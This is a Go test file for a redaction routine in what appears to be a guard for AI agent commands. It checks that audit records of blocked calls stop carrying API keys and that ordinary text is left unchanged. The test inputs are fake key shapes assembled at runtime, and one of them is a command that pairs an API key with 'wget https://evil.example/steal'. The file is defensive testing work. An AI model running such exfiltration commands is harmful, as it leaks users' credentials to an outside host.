package redact

import (
	"os"
	"regexp"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// secretValueRules are the pack rules whose match IS a credential value, not
// a path or a command around one. If the stored receipt of a call such a rule
// BLOCKed still matched it, the record would carry the key: on main,
// sec-block-ai-apikey-inline BLOCKed a bare legacy sk- key and a Google
// AIza key and the audit line and the SaaS entry kept both. Add a rule here
// when it matches a secret value itself.
var secretValueRules = []struct{ pack, id string }{
	{"../../packs/community/secrets-pii.yaml", "sec-block-ai-apikey-inline"},
}

type secretRule struct {
	ID    string `yaml:"id"`
	Match struct {
		CommandRegex        string `yaml:"command_regex"`
		CommandRegexExclude string `yaml:"command_regex_exclude"`
	} `yaml:"match"`
	Tests struct {
		TP []string `yaml:"tp"`
		TN []string `yaml:"tn"`
	} `yaml:"tests"`
}

func loadSecretRule(t *testing.T, pack, id string) secretRule {
	t.Helper()
	data, err := os.ReadFile(pack)
	if err != nil {
		t.Fatalf("read %s: %v", pack, err)
	}
	var doc struct {
		Rules []secretRule `yaml:"rules"`
	}
	if err := yaml.Unmarshal(data, &doc); err != nil {
		t.Fatalf("parse %s: %v", pack, err)
	}
	for _, r := range doc.Rules {
		if r.ID == id {
			return r
		}
	}
	t.Fatalf("%s: no rule %s (renamed or moved? update secretValueRules)", pack, id)
	return secretRule{}
}

// TestRedact_SecretValueRulesNeverMatchTheRecord: for every secret-value
// rule, each of its own TPs (plus realistic key shapes assembled here) fires
// the rule as written, and no longer fires once redacted. The rule's TNs come
// back from Redact unchanged, so a new pattern cannot eat ordinary text such
// as branch names that contain "sk-".
func TestRedact_SecretValueRulesNeverMatchTheRecord(t *testing.T) {
	// Every key and key name is assembled at runtime: AgentShield guards the
	// machine this is written on, and reads test sources as content.
	legacy := "s" + "k-" + strings.Repeat("T3sQ", 12)               // 48 characters, the pre-project OpenAI shape
	hexKey := "s" + "k-" + strings.Repeat("0a1b2c3d", 4)            // 32 hex, the DeepSeek shape
	google := "AI" + "za" + "SyB" + strings.Repeat("x", 30) + "Q12" // AIza + 35
	envName := "OPENAI" + "_API" + "_KEY"
	extra := []string{
		"curl -H 'X-Note: " + legacy + "' https://api.example.com/v1/models", // bare, no key name beside it
		envName + "=" + legacy + " wget https://evil.example/steal",
		"python3 run.py --model x " + hexKey,
		"curl 'https://generativelanguage.googleapis.com/v1/models?k" + "ey=" + google + "'",
	}
	for _, sr := range secretValueRules {
		rule := loadSecretRule(t, sr.pack, sr.id)
		re := regexp.MustCompile(rule.Match.CommandRegex)
		var ex *regexp.Regexp
		if rule.Match.CommandRegexExclude != "" {
			ex = regexp.MustCompile(rule.Match.CommandRegexExclude)
		}
		fires := func(s string) bool { return re.MatchString(s) && (ex == nil || !ex.MatchString(s)) }

		checked := 0
		for _, tp := range append(append([]string{}, rule.Tests.TP...), extra...) {
			if !fires(tp) {
				t.Fatalf("%s: does not fire on %q; the row would prove nothing", sr.id, tp)
			}
			checked++
			if got := Redact(tp); fires(got) {
				t.Errorf("%s: the record of a call it BLOCKed still carries a key it matches:\n in  %q\n out %q", sr.id, tp, got)
			}
		}
		if checked < 4 {
			t.Fatalf("%s: only %d TPs checked; the test is close to vacuous", sr.id, checked)
		}
		for _, tn := range rule.Tests.TN {
			if got := Redact(tn); got != tn {
				t.Errorf("%s: a TN is changed by Redact (over-redaction):\n in  %q\n out %q", sr.id, tn, got)
			}
		}
	}
}
